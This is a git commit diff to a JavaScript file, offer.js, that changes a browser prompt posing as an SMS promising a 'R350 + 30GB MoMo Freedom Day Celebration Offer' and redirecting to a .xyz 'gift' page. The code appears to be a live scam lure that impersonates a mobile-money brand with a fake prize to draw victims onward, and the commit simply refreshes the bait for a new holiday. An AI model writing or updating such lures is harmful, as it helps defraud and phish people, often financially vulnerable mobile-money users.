cee7e5e0fdfa65b61f2ff25adaa56150f0f9d106
realmankeny <realmankeny@gmail.com>
2025-04-23 01:20:58 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'R350'
-password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive R350 MoMo Easter Offer, Kindly Press OK to PROCEED  ','R350');
-if (password != 'R350') {
+var password = 'R350 + 30GB'
+password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive R350 + 30GB MoMo Freedom Day Celebration Offer, Kindly Press OK to PROCEED  ','R350 + 30GB');
+if (password != 'R350 + 30GB') {
 location.href='https://momo.goprogram.xyz/gift';
 }
